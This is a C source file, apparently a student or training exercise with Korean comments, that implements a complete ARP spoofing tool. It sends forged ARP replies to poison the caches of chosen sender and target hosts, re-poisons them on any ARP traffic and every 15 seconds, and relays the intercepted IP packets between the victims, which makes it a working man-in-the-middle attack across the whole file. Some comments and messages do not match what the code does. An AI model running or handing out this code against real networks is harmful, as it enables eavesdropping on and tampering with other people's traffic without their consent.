#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <net/ethernet.h>
#include <netpacket/packet.h>
#include <pcap.h>
#include <time.h>
#include "arphdr.h"
#include "ethhdr.h"
#pragma pack(push, 1)
struct etharpkt{
    eth_hdr eth;
    arp_hdr arp;
};
#pragma pack(pop)

#define MAX_PAIRS 10  // 최대 처리 쌍 수

void usage() {
    printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1\n");
    printf("syntax: send-arp <interface>\n");
    printf("sample: send-arp wlan0\n");
}

int search_my_ip(char* interface, uint32_t* my_ip) {
    struct ifreq ifr;
    int sock;

    sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
    if(sock < 0) {
        perror("socket");
        return 1;
    }

    strncpy(ifr.ifr_name, interface, IFNAMSIZ - 1);
    ifr.ifr_name[IFNAMSIZ - 1] = '\0';

    if(ioctl(sock, SIOCGIFADDR, &ifr) < 0) {
        perror("ioctl");
        close(sock);
        return 1;
    }

    *my_ip = ((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr.s_addr;

    close(sock);
    return 0;
}

int search_my_mac(char* interface, uint8_t* my_mac) {
    struct ifreq ifr;
    int sock;

    sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
    if(sock < 0) {
        perror("socket");
        return 1;
    }

    strncpy(ifr.ifr_name, interface, IFNAMSIZ - 1);
    ifr.ifr_name[IFNAMSIZ - 1] = '\0';

    if(ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) {
        perror("ioctl");
        close(sock);
        return 1;
    }

    memcpy(my_mac, ifr.ifr_hwaddr.sa_data, 6);

    close(sock);
    return 0;
}

int get_arp_packet(pcap_t* pcap, struct etharpkt* t_packet, uint32_t target_ip) {
    struct pcap_pkthdr* header;
    const u_char* packet;
    struct etharpkt* pkt;
    int res;

    while (1) {
        res = pcap_next_ex(pcap, &header, &packet);
        if(res == 0) continue;
        if(res == -1 || res == -2) {
            perror("pcap_next_ex");
            return -1;
        }

        pkt = (struct etharpkt*)packet;

        if(ntohs(pkt->eth.eth_type) != 0x0806) continue;
        if(ntohs(pkt->arp.opcode) != 2) continue;
        if(pkt->arp.sip != target_ip) continue;

        memcpy(t_packet, pkt, sizeof(struct etharpkt));

        return 0;
    }
}

int main(int argc, char* argv[]){
    if(argc < 4 || argc % 2 != 0){
        usage();
        return 1;
    }

    int pair_count = (argc / 2) - 1;  // 처리할 쌍의 개수
    if(pair_count > MAX_PAIRS) {
        fprintf(stderr, "Too many pairs (max %d)\n", MAX_PAIRS);
        return 1;
    }

    char* interface = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(interface, BUFSIZ, 1, 1000, errbuf);
    if(pcap == NULL){
        fprintf(stderr, "couldn't open device %s(%s)\n", interface, errbuf);
        pcap_close(pcap);
        return 1;
    }

    uint8_t my_mac[6];
    uint32_t my_ip;

    if(search_my_mac(interface, my_mac) != 0 || search_my_ip(interface, &my_ip) != 0){
        fprintf(stderr, "error : can't find my mac or ip\n");
        pcap_close(pcap);
        return 1;
    }

    // MAC 주소와 공격 패킷을 저장할 배열
    uint8_t vmac[MAX_PAIRS][6];
    uint8_t tmac[MAX_PAIRS][6];
    struct etharpkt attack_pkt_sender[MAX_PAIRS];   // sender에게 보내는 공격 패킷
    struct etharpkt attack_pkt_target[MAX_PAIRS];   // target에게 보내는 공격 패킷

    // 모든 쌍에 대해 MAC 주소 확인 및 공격 패킷 준비
    for(int i = 0; i < pair_count; i++){
        struct etharpkt request_pkt;

        // Ethernet Header
        uint8_t broadcast_mac[6] = { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff };
        memcpy(request_pkt.eth.dmac, broadcast_mac, 6);
        memcpy(request_pkt.eth.smac, my_mac, 6);
        request_pkt.eth.eth_type = htons(0x0806);

        // ARP Header (Request)
        request_pkt.arp.htype = htons(0x0001);
        request_pkt.arp.ptype = htons(0x0800);
        request_pkt.arp.hsize = 6;
        request_pkt.arp.psize = 4;
        request_pkt.arp.opcode = htons(1);
        memcpy(request_pkt.arp.smac, my_mac, 6);
        request_pkt.arp.sip = my_ip;

        uint8_t unknown_mac[6] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
        memcpy(request_pkt.arp.tmac, unknown_mac, 6);
        
        // sender MAC 찾기
        request_pkt.arp.tip = inet_addr(argv[2 + (i * 2)]);
        if(pcap_sendpacket(pcap, (const u_char*)&request_pkt, sizeof(struct etharpkt)) != 0) {
            fprintf(stderr, "Error: Failed to send request packet\n");
            pcap_close(pcap);
            exit(EXIT_FAILURE);
        }

        struct etharpkt arp_response;
        get_arp_packet(pcap, &arp_response, inet_addr(argv[2 + (i * 2)]));
        memcpy(vmac[i], arp_response.arp.smac, 6);

        // target MAC 찾기
        request_pkt.arp.tip = inet_addr(argv[3 + (i * 2)]);
        if(pcap_sendpacket(pcap, (const u_char*)&request_pkt, sizeof(struct etharpkt)) != 0) {
            fprintf(stderr, "Error: Failed to send request packet\n");
            pcap_close(pcap);
            exit(EXIT_FAILURE);
        }
        get_arp_packet(pcap, &arp_response, inet_addr(argv[3 + (i * 2)]));
        memcpy(tmac[i], arp_response.arp.smac, 6);

        // 공격 패킷 준비 (sender용) - target의 IP가 내 MAC이라고 속임
        memcpy(attack_pkt_sender[i].eth.dmac, vmac[i], 6);  // broadcast로 전송
        memcpy(attack_pkt_sender[i].eth.smac, my_mac, 6);
        attack_pkt_sender[i].eth.eth_type = htons(0x0806);
        attack_pkt_sender[i].arp.htype = htons(0x0001);
        attack_pkt_sender[i].arp.ptype = htons(0x0800);
        attack_pkt_sender[i].arp.hsize = 6;
        attack_pkt_sender[i].arp.psize = 4;
        attack_pkt_sender[i].arp.opcode = htons(2);
        memcpy(attack_pkt_sender[i].arp.smac, my_mac, 6);
        attack_pkt_sender[i].arp.sip = inet_addr(argv[3 + (i * 2)]);  // target IP를 sender라고 속임
        memcpy(attack_pkt_sender[i].arp.tmac, vmac[i], 6);
        attack_pkt_sender[i].arp.tip = inet_addr(argv[2 + (i * 2)]);  // sender IP를 target이라고 속임

        // 공격 패킷 준비 (target용) - sender의 IP가 내 MAC이라고 속임
        memcpy(attack_pkt_target[i].eth.dmac, tmac[i], 6);  // broadcast로 전송
        memcpy(attack_pkt_target[i].eth.smac, my_mac, 6);
        attack_pkt_target[i].eth.eth_type = htons(0x0806);
        attack_pkt_target[i].arp.htype = htons(0x0001);
        attack_pkt_target[i].arp.ptype = htons(0x0800);
        attack_pkt_target[i].arp.hsize = 6;
        attack_pkt_target[i].arp.psize = 4;
        attack_pkt_target[i].arp.opcode = htons(2);
        memcpy(attack_pkt_target[i].arp.smac, my_mac, 6);
        attack_pkt_target[i].arp.sip = inet_addr(argv[2 + (i * 2)]);  // sender IP
        // ARP target MAC을 0으로 설정 (broadcast ARP reply)
        uint8_t zero_mac[6] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
        memcpy(attack_pkt_target[i].arp.tmac, tmac[i], 6);
        attack_pkt_target[i].arp.tip = inet_addr(argv[3 + (i * 2)]);  // target IP

        if(pcap_sendpacket(pcap, (const u_char*)&attack_pkt_sender[i], sizeof(struct etharpkt)) != 0) {
            fprintf(stderr, "Error sending packet: %s\n", pcap_geterr(pcap));
        }
        if(pcap_sendpacket(pcap, (const u_char*)&attack_pkt_target[i], sizeof(struct etharpkt)) != 0) {
            fprintf(stderr, "Error sending packet: %s\n", pcap_geterr(pcap));
        }
        printf("Sent ARP spoof packets (5 times each)\n");
        printf("  Sender MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
            vmac[i][0], vmac[i][1], vmac[i][2], vmac[i][3], vmac[i][4], vmac[i][5]);
        printf("  Target MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
            tmac[i][0], tmac[i][1], tmac[i][2], tmac[i][3], tmac[i][4], tmac[i][5]);
    }

    printf("ARP spoofing started for %d pair(s)...\n", pair_count);

    // 정기적인 ARP 재공격을 위한 타이머 변수
    time_t last_arp_attack = time(NULL);
    const int ARP_ATTACK_INTERVAL = 15; // 15초마다 재공격

    // 패킷 수신 카운터
    int packet_count = 0;
    int arp_count = 0;
    int ip_count = 0;

    // 단일 무한 루프에서 모든 쌍 처리
    while(true){
        struct pcap_pkthdr* header;
        const u_char* packet;
        struct etharpkt* pkt;
        int res;

        res = pcap_next_ex(pcap, &header, &packet);
        
        if(res == 0) continue;

        if(res == -1 || res == -2){
            perror("pcap_next_ex");
            break;
        }

        packet_count++;
        pkt = (struct etharpkt*)packet;

        // ARP 패킷이면 모든 쌍에 대해 재공격 sender와 target 모두에게 한번에 해야한다.
        if(ntohs(pkt->eth.eth_type) == 0x0806) {
            if(memcmp(pkt->eth.smac, my_mac, 6) == 0) continue;

            for(int i = 0; i < pair_count; i++){
                pcap_sendpacket(pcap, (const u_char*)&attack_pkt_sender[i], sizeof(struct etharpkt));
                pcap_sendpacket(pcap, (const u_char*)&attack_pkt_target[i], sizeof(struct etharpkt));
            }
        }

        // 정기적인 ARP 재공격 15초마다
        time_t current_time = time(NULL);
        if(difftime(current_time, last_arp_attack) >= ARP_ATTACK_INTERVAL) {
            printf("Sending periodic ARP re-attack packets...\n");
            for(int i = 0; i < pair_count; i++){
                if(pcap_sendpacket(pcap, (const u_char*)&attack_pkt_sender[i], sizeof(struct etharpkt)) != 0) {
                    fprintf(stderr, "Error sending periodic ARP packet: %s\n", pcap_geterr(pcap));
                }
                if(pcap_sendpacket(pcap, (const u_char*)&attack_pkt_target[i], sizeof(struct etharpkt)) != 0) {
                    fprintf(stderr, "Error sending periodic ARP packet: %s\n", pcap_geterr(pcap));
                }
            }
            last_arp_attack = current_time;
        }

        // IP 패킷이면 MAC 주소 변경 후 전송
        if(ntohs(pkt->eth.eth_type) != 0x0800) continue;

        // 모든 쌍에 대해 확인
        for(int i = 0; i < pair_count; i++){
            // sender -> attacker -> target 방향
            if(memcmp(pkt->eth.smac, vmac[i], 6) == 0 && memcmp(pkt->eth.dmac, my_mac, 6) == 0){
                struct etharpkt* modified_pkt = (struct etharpkt*)malloc(header->len);
                if(modified_pkt == NULL) {
                    fprintf(stderr, "Memory allocation failed\n");
                    continue;
                }
                memcpy(modified_pkt, pkt, header->len);
                memcpy(modified_pkt->eth.smac, my_mac, 6);
                memcpy(modified_pkt->eth.dmac, tmac[i], 6);
                if(pcap_sendpacket(pcap, (const u_char*)modified_pkt, header->len) != 0) {
                    fprintf(stderr, "Error relaying packet: %s\n", pcap_geterr(pcap));
                }
                free(modified_pkt);
            }
            
            // target -> attacker -> sender 방향
            if(memcmp(pkt->eth.smac, tmac[i], 6) == 0 && memcmp(pkt->eth.dmac, my_mac, 6) == 0){
                struct etharpkt* modified_pkt = (struct etharpkt*)malloc(header->len);
                if(modified_pkt == NULL) {
                    fprintf(stderr, "Memory allocation failed\n");
                    continue;
                }
                memcpy(modified_pkt, pkt, header->len);
                memcpy(modified_pkt->eth.smac, my_mac, 6);
                memcpy(modified_pkt->eth.dmac, vmac[i], 6);
                if(pcap_sendpacket(pcap, (const u_char*)modified_pkt, header->len) != 0) {
                    fprintf(stderr, "Error relaying packet: %s\n", pcap_geterr(pcap));
                }
                free(modified_pkt);
            }
        }
    }

    pcap_close(pcap);
    return 0;
}
